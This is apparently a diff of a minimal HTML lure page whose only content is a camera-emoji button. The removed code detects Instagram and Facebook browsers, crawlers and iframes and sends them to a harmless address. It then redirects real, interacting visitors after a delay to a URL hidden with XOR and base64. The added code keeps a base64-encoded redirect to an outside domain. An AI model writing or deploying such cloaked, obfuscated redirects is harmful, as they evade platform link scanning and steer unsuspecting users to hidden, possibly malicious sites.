@@ -5,76 +5,70 @@
   <title>📷</title>
   <meta name="viewport" content="width=device-width, initial-scale=1.0" />
   <style>
-    * { box-sizing: border-box; }
-    html, body {
+    * {
+      box-sizing: border-box;
+    }
+
+    body {
       margin: 0;
       padding: 0;
-      height: 100%;
-      background: linear-gradient(to bottom, #f09433 0%, #e6683c 25%, #dc2743 50%, #cc2366 75%, #bc1888 100%);
+      background-color: #000;
+      color: #fff;
       font-family: system-ui, sans-serif;
       display: flex;
       justify-content: center;
       align-items: center;
+      height: 100vh;
     }
 
     .container {
-      background: white;
-      border-radius: 50px;
-      padding: 1.2rem 2rem;
-      box-shadow: 0 4px 30px rgba(0, 0, 0, 0.2);
-      display: flex;
-      align-items: center;
-      justify-content: center;
+      max-width: 90%;
+      width: 100%;
+      background-color: #111;
+      padding: 2rem;
+      border-radius: 1rem;
+      box-shadow: 0 0 20px rgba(255, 255, 255, 0.1);
+      text-align: center;
+    }
+
+    .btn {
+      background-color: #222;
+      color: #fff;
+      border: none;
+      border-radius: 12px;
+      padding: 1rem 2rem;
+      font-size: 2rem;
       cursor: pointer;
-      transition: transform 0.2s ease;
-      width: 80%;
-      max-width: 400px;
+      width: 100%;
+      transition: background-color 0.3s ease;
     }
 
-    .container:hover {
-      transform: scale(1.05);
+    .btn:hover {
+      background-color: #333;
     }
 
-    .icon {
-      color: black;
-      font-size: 2.5rem;
-      display: flex;
-      align-items: center;
-      justify-content: center;
+    @media (max-width: 480px) {
+      .btn {
+        font-size: 1.5rem;
+        padding: 0.8rem 1.2rem;
+      }
+
+      .container {
+        padding: 1.5rem;
+      }
     }
   </style>
 </head>
 <body>
-  <div class="container" id="realButton">
-    <div class="icon">📷</div>
+  <div class="container">
+    <button class="btn" onclick="go()">📷</button>
   </div>
 
   <script>
-    (function () {
-      const ua = navigator.userAgent.toLowerCase();
-      const isInsta = ua.includes("instagram") || ua.includes("facebookexternalhit") || ua.includes("fbav") || ua.includes("fbios");
-      const isIframe = window.top !== window.self;
-      if (isInsta || isIframe) {
-        location.href = "https://example.com";
-        return;
-      }
-    })();
-
-    let interacted = false;
-    document.addEventListener("touchstart", () => interacted = true);
-    document.addEventListener("keypress", () => interacted = true);
-
-    document.getElementById("realButton").addEventListener("click", function () {
-      if (!interacted) return;
-
-      setTimeout(() => {
-        const encoded = "Z3Z5dGphKyxwYXRiZGVxZnt4Z3g+e2pvZmly"; // XOR + base64 of final URL
-        const xorKey = 3;
-        const base64Decoded = atob(encoded);
-        const finalURL = base64Decoded.split('').map(c => String.fromCharCode(c.charCodeAt(0) ^ xorKey)).join('');
-        window.location.href = finalURL;
-      }, 2000);
-    });
+    function go() {
+      const encoded = "aHR0cHM6Ly9nYXlyb24ubGlmZS9yZWhiaXhlZQ=="; // base64: https://gayron.life/rehbixee
+      window.location.href = atob(encoded);
+    }
   </script>
 </body>
 </html>
